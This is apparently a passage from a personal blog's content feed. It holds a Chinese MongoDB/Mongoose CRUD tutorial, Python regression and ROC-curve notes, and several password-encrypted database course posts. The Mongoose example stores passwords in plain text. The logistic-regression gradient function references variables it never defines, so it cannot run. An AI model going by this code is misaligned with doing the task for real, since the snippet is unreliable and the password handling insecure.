 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查詢 age:20 或 age:25 的文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;$<span class="keyword">or</span>:[&#123;age:<span class="number">20</span>&#125;, &#123;age:<span class="number">25</span>&#125;]&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢集結裡文檔的總數：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find().<span class="built_in">count</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="NodeJS操作"><a href="#NodeJS操作" class="headerlink" title="NodeJS操作"></a>NodeJS操作</h2><h3 id="連接數據庫"><a href="#連接數據庫" class="headerlink" title="連接數據庫"></a>連接數據庫</h3><ol>
<li><p>安裝<code>mongoose</code>模塊：</p>
<ul>
<li>用戶操作數據庫  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i mongoose</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>連接數據庫：</p>
<ul>
<li><p>創建<code>config</code>文件添加<code>db.config.js</code>文件</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入 mongoose 模塊</span></span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>)</span><br><span class="line"><span class="comment">// 連接並自動創建 donald_project 數據庫</span></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://127.0.0.1:27017/donald_project&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>app.js</code>或<code>www</code>入口文件引入</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;../config/db.config&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>創建集合：</p>
<ul>
<li>創建<code>model</code>文件專門放置模型</li>
<li>新建<code>UserModel.js</code>文件創建<code>users</code>集合  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// user模型</span></span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Schema</span> = mongoose.<span class="property">Schema</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 限制集合中的字段與類型</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserType</span> = &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="title class_">Number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建模型</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">UserModel</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;user&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Schema</span>(<span class="title class_">UserType</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模型 user 將會對應 users 集合（集合名字 = 模型名字 + s）</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">UserModel</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>路由中操作數據庫：</p>
<ul>
<li>引入模型即可進行操作  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">UserModel</span> = <span class="built_in">require</span>(<span class="string">&#x27;../model/UserModel&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="數據庫操作"><a href="#數據庫操作" class="headerlink" title="數據庫操作"></a>數據庫操作</h3><ol>
<li><p>添加：</p>
<ul>
<li>使用<code>Model.create()</code>方法添加文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 結構賦值 AJAX 傳來的數據</span></span><br><span class="line"><span class="keyword">const</span> &#123;username, password, age&#125; = req.<span class="property">body</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">create</span>(       <span class="comment">// 往模型添加文檔：&#123; 內容 &#125;</span></span><br><span class="line">    &#123;username, password, age&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>刪除：</p>
<ul>
<li>使用<code>Model.deleteOne()</code>方法刪除第一個符合條件的文檔</li>
<li>使用<code>Model.deleteMany()</code>方法刪除所有符合條件的文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">deleteOne</span>(    <span class="comment">// 刪除指定文檔：&#123; 條件 &#125;</span></span><br><span class="line">    &#123;<span class="attr">_id</span>:req.<span class="property">params</span>.<span class="property">id</span>&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>更改：</p>
<ul>
<li>使用<code>Model.updateOne()</code>方法更改第一個符合條件的文檔</li>
<li>使用<code>Model.updateMany()</code>方法更改所有符合條件的文檔</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">updateOne</span>(    <span class="comment">// 更改指定文檔：&#123; 條件 &#125;, &#123; 內容 &#125;</span></span><br><span class="line">    &#123;<span class="attr">_id</span>:req.<span class="property">params</span>.<span class="property">id</span>&#125;, &#123;username, password, age&#125;</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;        <span class="comment">// 成功的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;       <span class="comment">// 出錯的回調函數</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>查詢：</p>
<ul>
<li>使用<code>Model.find()</code>方法查詢符合條件的文檔</li>
<li>可以追加<code>sort()</code>、<code>skip()</code>、<code>limit()</code>方法</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">UserModel</span>.<span class="title function_">find</span>(</span><br><span class="line">    &#123;&#125;,                     <span class="comment">// 查詢條件</span></span><br><span class="line">    [<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;age&#x27;</span>]     <span class="comment">// 獲取指定字段</span></span><br><span class="line">)</span><br><span class="line">.<span class="title function_">sort</span>(&#123;<span class="attr">age</span>:-<span class="number">1</span>&#125;)             <span class="comment">// 按照 age 倒序排序</span></span><br><span class="line">.<span class="title function_">skip</span>((page - <span class="number">1</span>) * limit).<span class="title function_">limit</span>(limit)  <span class="comment">// 指定頁面返回對應的文檔數</span></span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(data)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>NodeJS</category>
      </categories>
      <tags>
        <tag>NodeJS</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Python - Regression</title>
    <url>/myBlog/2022/09/30/2022/2022-9-30-PS-Py-LinearRegression/</url>
    <content><![CDATA[<h1 id="Linear-Regression-Curve"><a href="#Linear-Regression-Curve" class="headerlink" title="Linear Regression Curve"></a>Linear Regression Curve</h1><ol>
<li><p>Import modules</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> statistics <span class="keyword">import</span> variance</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"></span><br><span class="line">np.set_printoptions(suppress=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Import data through <code>pandas</code></p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">train_data = pd.read_csv(<span class="string">&quot;train_data.csv&quot;</span>)</span><br><span class="line">X_train = np.array(train_data[<span class="string">&#x27;x&#x27;</span>].tolist())</span><br><span class="line">y_train = np.array(train_data[<span class="string">&#x27;y&#x27;</span>].tolist())</span><br><span class="line"></span><br><span class="line">test_data = pd.read_csv(<span class="string">&quot;test_data.csv&quot;</span>)</span><br><span class="line">X_test = test_data[<span class="string">&#x27;x&#x27;</span>].tolist()</span><br><span class="line">y_test = test_data[<span class="string">&#x27;y&#x27;</span>].tolist()</span><br></pre></td></tr></table></figure>

</li>
<li><p>Compute the optimal theta based on the formula: $$\hat{\theta} &#x3D; (X^TX)^{-1}X^TY$$.</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">optimalTheta</span>(<span class="params">X, y</span>):</span><br><span class="line">    <span class="keyword">return</span> np.matmul(np.matmul(np.linalg.inv(np.matmul(X.transpose(), X)), X.transpose()), y)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Sketch the curve using <code>matplotlib.pyplot</code></p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sketchGraph</span>(<span class="params">theta, color</span>):</span><br><span class="line">    plt.scatter(X_train, y_train)</span><br><span class="line">    i = np.linspace(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> dimension <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(theta)):</span><br><span class="line">        j += theta[dimension] * <span class="built_in">pow</span>(i, dimension)</span><br><span class="line">        </span><br><span class="line">    plt.plot(i, j, color)</span><br><span class="line">    plt.xlim(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">    plt.ylim(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="Logistic-Regression"><a href="#Logistic-Regression" class="headerlink" title="Logistic Regression"></a>Logistic Regression</h1><ol>
<li><p>Set up the logistic model</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Logistic Model</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">computeError</span>(<span class="params">theta</span>):</span><br><span class="line">    lm = [<span class="number">1</span>/(<span class="number">1</span> + np.exp(-(np.matmul(X_train[i].transpose(), theta)))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prediction Accuracy</span></span><br><span class="line">    p = [lm[i] ** y_train[i] * (<span class="number">1</span> - lm[i]) ** (<span class="number">1</span> - y_train[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Maximum Likelihood Estimation</span></span><br><span class="line">    E = -<span class="number">1</span> * <span class="built_in">sum</span>([np.log(p[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(X_train))])</span><br><span class="line">    <span class="keyword">return</span> E</span><br></pre></td></tr></table></figure>

</li>
<li><p>Computing the gradient</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compGradient</span>(<span class="params">X, theta</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">X, theta</span>):</span><br><span class="line">        partialDe0 = [(<span class="number">1</span> - y_train[i] - math.exp(-<span class="number">1</span> * np.matmul(X[i].transpose(), theta)) / (<span class="number">1</span> + math.exp(-<span class="number">1</span> * np.matmul(X[i].transpose(), theta)))) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">        <span class="keyword">return</span> [partialDe0, partialDe1, partialDe2]</span><br><span class="line"></span><br><span class="line">    de = de(X_train, theta)</span><br><span class="line"></span><br><span class="line">    gradient = <span class="built_in">sum</span>(de)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [gradient]</span><br></pre></td></tr></table></figure>

</li>
<li><p>Computing the iteraction</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">lr = <span class="number">1</span>      <span class="comment"># learning rate</span></span><br><span class="line">theta = np.array([-<span class="number">2.5</span>, <span class="number">6.0</span>, <span class="number">0.5</span>])  <span class="comment"># initial theta</span></span><br><span class="line">gradient = np.array([<span class="number">0.723</span>, <span class="number">0.084</span>, <span class="number">0.433</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    theta = theta - gradient * lr</span><br><span class="line">    E = computeError(theta)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Iteration&#x27;</span>, i + <span class="number">1</span>, <span class="string">&#x27;=&#x27;</span>, [E])</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python - ROC Curve</title>
    <url>/myBlog/2022/09/30/2022/2022-9-30-PS-Py-ROCCurve/</url>
    <content><![CDATA[<h1 id="ROC-Curve-Plotter"><a href="#ROC-Curve-Plotter" class="headerlink" title="ROC Curve Plotter"></a>ROC Curve Plotter</h1><ol>
<li><p>Import modules</p>
<ul>
<li>Using <code>sklearn</code> to plot the ROC Curve <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score, confusion_matrix, roc_auc_score, roc_curve</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Plot curve</p>
<ul>
<li>get the <font color="#3A75EA">false positive rate</font>, <font color="#3A75EA">true positive rate</font> and <font color="#3A75EA">thresholds</font> by inputting the passing coordinates. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get the require elements</span></span><br><span class="line">fpr, tpr, thresholds = roc_curve([<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>], [<span class="number">0.56</span>, <span class="number">0.61</span>, <span class="number">0.43</span>, <span class="number">0.78</span>, <span class="number">0.12</span>, <span class="number">0.47</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># sketch the coordinates</span></span><br><span class="line">plt.scatter([<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>/<span class="number">3</span>, <span class="number">1</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">2</span>/<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># plot the curve</span></span><br><span class="line">plt.plot(fpr, tpr)</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;False Positive Rate&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True Positive Rate&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;model 1 AUC score: <span class="subst">&#123;roc_auc_score([<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>], [<span class="number">0.56</span>, <span class="number">0.61</span>, <span class="number">0.43</span>, <span class="number">0.78</span>, <span class="number">0.12</span>, <span class="number">0.47</span>])&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<!-- <font color="#3A75EA"><font/> -->]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Entity-Relationship Model</title>
    <url>/myBlog/2023/01/28/2023/CSCI3170/2023-1-28-CSCI3170-ERModel/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="7b9e96bf24cd204d0fedd52832f73289e5d70f12081afd1328a2c42686f2ddda"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Relational Algebra</title>
    <url>/myBlog/2023/02/16/2023/CSCI3170/2023-2-16-CSCI3170-RelationalAlgebra/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1cca06c4528600fb233b5db070653ed571c4479140946c8a2aa5837428976cf7"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Relational Model</title>
    <url>/myBlog/2023/02/15/2023/CSCI3170/2023-2-15-CSCI3170-RelationalModel/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="85e365e86278eedcd77562ef81f2f1acf461b2e81e6c8f931879e51c1e2ba04f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/myBlog/lib/hbe.js"></script><link href="/myBlog/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Structured Query Language</title>
    <url>/myBlog/2023/03/10/2023/CSCI3170/2023-3-10-CSCI3170-SQL/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="dcdd1bea13867092a10c3cc47e63b3189052b3f57490941f9a1f6183f3e3d769">c79c25ae1d633f4b2d8417db5e428bb21801ce58e4b0029ef27bd5c63dd0ce8c2b6e3057816c9b1b0cffe5b1bf573aaafa5f5b22edb64d1524d597bb9b4c7f7b02b5ac1bc4a1a37b107e0421436b22d050b22f957f4d68be3e8748cc33c012831f507adb42ccff2e01251b6b49c167c16655543401c5d21385b6123bf026516cfd06b3559e074877ee043359ef08d80c16580f19859b21e29e9ef901c338f174f9ff75df511d6d244cbb164efde19bd7724ad428aadd87564b50b120ae5dfa1ea45b736366b4a8b1dfc49321d0998fae4b70bceea205c10d4f66a78d42ac7fa0604d733148a7c245a9bdb1f129ffc1810ba1be1b597e6cbfbff711b7fa8f7ee0d8d538bb69d1206f62eef3cfe5bb22dd1f01d77961e62bb6b4e543d0f8d0cd263747cf3920054b36f353d0988e5a429fdc859240332a93d23a2bbecd2cd4523710da0846ca1421d4daccfa6be2f3a8f98b46f7c4b27dea9ad257a2a95d50251878d15dc86f2f5b851a0ba863a28856089d50c84aaaed1696905060b75b305ae224c0baafc3c8305bfdb0977031c7c2e74501ccdf12bc2c7e94eeac019e4665a7e9876236db42a518cb6c9d9186ea168386b4bdd11d3e520b715f71959e27891ec8c78576d6581bf6573a7cf92ff23a74d095965e325f27e79d15d3d39b81989099cb49ef76d4e0b916b8aaab935ee1829149c0c04afb3039ebeff819fe3a7000246dee358662fdaef7c27433815775ae6b535e942158613bfd1c795bfc291a7837ce401f034470ace449426cfb0585ad656f09bd4e0700bbd36b98cf4df65da27bb91bf9db36ecddc6293578944b268a6e0532ea27d162a0d0b648983ae1edbee31c1e1956b854872c22d49780aa6b5a070a3d2dad86b11c4ab3b3a72fe6bf30bd54a585e69ac19b3247226dd027d2bdc5698552fc600fdea8551c21f524a6a83ec1acf57feccd4716760abd721ca7485594ba7e228d59eb5a78accda9d8ffd7672b8d3c8fe818775b4820c59cb3c0935aefa0cdb919ac1c84f8a35cc6c374bcbe7db6a8f29d5b3e3c109d813ba1040dc92db41bdbbdf96702586fed4d846d41f430b7fb338b3f1c54c4a29539baadeeb7584901a0a122d22c3ed74a332c15b9dd9cb8b2d865d6867655f85cadc13b1aa7e7dfe18248988fb6b661af81a08ff5666d3859f5579493bedbb82c26fba39b993b3fd2aa664c65116e540ad3ba2a8704b8e70481fa3a1363216594fd643042088af3aa6d0aa378b839e5b207bf3e4ae269328ec1589c87a11548dc0fd947388b975b024c07e0b572acd874ad485cdfffffd9e8eb928a65b135c24e8211c064d139251acf4d03a09bdad7100fa0c86aba6e3ce76defcb449adfca45f65803644965757d2f2f664a12e1b43ae732315ecafd49628a39b7cfec6b3c183174c46bcd8458e923be6918870d802520e00154eac2ced8802b5a84de7869b14c5c37b6986ccbd3160c26f6abd54f6c88f0b8aacc0525fcc69cfa6cdbb463254cc52c145829945dcc6dc400e35ee9b95c5b93c2ae531fc127c25be22ee217368d8a80d2ce637c98c22a6b3046f76270df76f8899b3d443d2a06f70c86d848d04cc1cebc5210ad3318b66386ddd6e4ecec591bfcf1dc259bb27e87b23753817f25cbfe05b38c049c1b2f26f58e8bb8529b787a82014745b59256d3decb661ed1def7078703bc2ca227571f00bc6c45d55518228cbdce329edbf82e63781ea4aa60f8007dc52f10ff724989e8606baab0bdb9a940a7ff5581d4e91ed653e222191b04c4b6e4e3b9f093ca3a83a41574ee1ceb93bf227e40d14c9cc5731f7156f2f1fe20c727518ae94333bf7c65aff5d331341f915918df5b4ab9a668c3f880b51b5d3bb503ebe95bb8f8e1792a9485ac4e096daa7e20f4c6ab44af1181fb1ddc48dd8a74dc0ac9ace9da68f1db166553814d5e0554050f2baf6e60d9e7306964263217d16982fff1c6bd6fb707b7cc905dc6a0ce99fa062174b4d89353b37096e89ca505d5c35530b51901b9df70b3bc7b8e9e172e984aca98bcc566ec54520b853dd615df595ada5ce6ac8c5786b634a078e14406032d7b5b1fe0e1a4a5965c074b305d9d334480e5ca9012eaa499c5d2e96922aad1dbff25fc9a09d68c1655941c9378b7d5443480e7905c5f5717429fa9ba52f80b65d42449396883e8b9a0ba9af2e7a2edb83dfebb99bbf981db9853ea0e807b0505d10a00b8bcd3ffb5c9d497ad8eceb0f13c77e0740dfa3a13479c3c611f4e7bce3d660f5997d50709373d384ff50f0fc73ea84d7aa8a8de315c99d13e41732835a661ac543e6fcda87baa0f8f27edbd24b0f72abf259d60fbf0602001738785df3790aa8049c750f48026d07d3c259e1a9f77c5e0b6d16ca8064e03851b63c6aa637385626837ef79da00014349352f905ac48bd5d2b121b2e00fb06f4cbcdffa88208578854a6f5a9391ef469b7739ac28a886b2b59f6cb8f07818bb45787a7f88fb7346195e8de5c032544c5697bcd10b600217ace6b4f40cf779750f2bfbe4d9d230fff54b20bcb55b9ff237c847fd1a47bc1ee9647ded69eee2861be11e0fbba1e206ed8b4d09142fb81fb743f030edf4c7c0275db63b4e2166c022037b47dd1f35d51c307de6f442359731698fa06e8ab6c9931b207d22b9ae24b6476edc9ae4fa8009cc4eb08824a6d632e7935d351758ec6c096f977055c8caf111efbd614eedb89226155ede2a31b07908d32a27991f299a17380028fa6f8d28bb25a8fa05d910ec26bcaad8fcfdce5f03979fd4f4ba9be2adc768b49fe8a516323a0ea7e76d35dc04f4a8f1f75b54c10e0835cfbd6d20dfe4ea19a1a3df927a0505f298b4d1b7b3134e6145a3fba0cf187d799f7b9cd7ed0caee46a0b71812932326cdd3efa833e7c1d703aa230b34c044cde6f3efd0d70f6ecd41daf2fb6a4f3332d918acf21fe441ed7e537e0dd36a76a2ff130738056aa38defbef1524372369e3f8ac5909aea3da7066fb3ef10e21d8731ca915e96261e98e6cb1d771e084688d09f20bc55e6cfa9252a8d39926588275029b7f533920bf35a03070142b4931622a33c8c89c1257c0e238b877b841abfa156f710108ee3fe21a031346486dfb58edc4ef330cc51068720abf07c4dac713a0945752e833fc6a18c3308a3c412702d769bab5c20e5cf6e3a1ebdc65057eacf536003d86404db6d7f59feff4d47e228dd25cdfef8d974d4e7c83cc365042e4d7bce9aeeddbdf5dbcef77e4fc694526a1386c3bf6232e01c16a98dc99c52e5d1ef539f4c68cba71676d2fdb5917db042cb873260899acadf2f239eb0326ed512c01e435ffbc30e94db437f880c8985bfa6f6a6d492c5aaadd4e5af88b107b55e03c25d4ba698b9bf5cf908539454db29cd01963d9a2129626b1fe5a0294a893c5fedced7c7143da06f2dae557945412dd75901c0a94e2149e7f7535b7a9829a2c7c8cbc400c2d4a909a630c60a81e9d879ceb1cd6c226087dc3248459d8b90ce99be84059b6ee00644f773bf8a957838456bcc45797ff8f3a0924e196b1bbc62253862c1005005de1856669ba8521fe89db5a57335d583f5dc948427c0c14e61ebe9de4669d8b026ab9af510b1e2c9fffa9ad893bfff52d42051a9b2402ba7a9c225fd844c6633aae80020dd35200ea3bd2c2a2aec6cb7709981f3b3f5ae1ee2569f2c69fdb247cfd0c04967e9f8a3060dd4b83f461d9eea70dd66c9ca633c7fd9cdcc6d7e8117eb550ba622eff8ce88fb9693f1c0b58b46b6fc3e38cb0c657208eeeb22060a59a53fe35b366f4d2020bd1f95e26999b1f53f1aa5df69a480635164540ed2b68a1688d071850e6b495ae2c3019527f6838d31034177ea9b6a7966d741f122f35ddbef89f7b83554196055f63991ecdf564bc70dcceef6d58a01adf84d797356550887091ba34e72e9e1629cf7c0ec7f8bea950eacef8eeccc412fc493814f84df4864426d9de6b8375bb366eb77ff703a13ca7c12dc57ac16cd7f8a5598aff9cd31a5892f809431a4f2b086ae7bba321e5b24281e7f57fc187ed2a718a55434f563bc8d35b8a658fd52939b23b53a909a303f2582a0f82664bb45c6c851b9164ee626dc76747ba5982a2a0c502d22f00af75049d9a57a9c4f14ac3fe2b50c5b4938f7ebeeb509a3693d2d2a7f81c519308097231329b36c25a6dff192f371e27fc9de2886173374770cf441f754a4f01056a8d86dc8f286f09181aef515145008fb93554a75ff95c649d285710db616d185ff11652911a14b5b99c0f6e6d94ce02579bdf5b7a06c95faa5a6a3ef96aebb5205d00f2f6e389633e11fac1602321d4e9b4fe1ead40ef0159733fe961e38d428e6d387fc0cd3ae6c7ddf5a29f0f4c37ddd19e16814f7271af13e62e